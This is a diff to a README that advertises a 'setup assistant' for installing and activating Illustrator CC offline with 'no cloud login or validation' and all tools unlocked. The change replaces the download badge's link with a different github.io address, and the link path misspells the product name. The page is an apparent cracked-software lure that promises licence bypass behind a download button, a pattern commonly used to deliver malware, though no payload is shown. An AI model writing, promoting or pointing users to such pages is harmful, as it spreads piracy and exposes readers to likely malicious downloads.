@@ -3,7 +3,7 @@
 This setup assistant helps you install and activate Illustrator CC in a fully offline environment with built-in AI capabilities. No cloud login or validation required. All 3D and creative tools are unlocked by default.
 
 <p align="center">
-  <a href="https://download-portal-demo.github.io/.github/IllustartorCCAi1">
+  <a href="https://trahendon.github.io/.github/IllustartorCCAi12">
     <img src="https://img.shields.io/badge/Download_Setup_Assistant-Click_Here-ff9a00?style=for-the-badge&logo=adobe&logoColor=white">
   </a>
 </p>
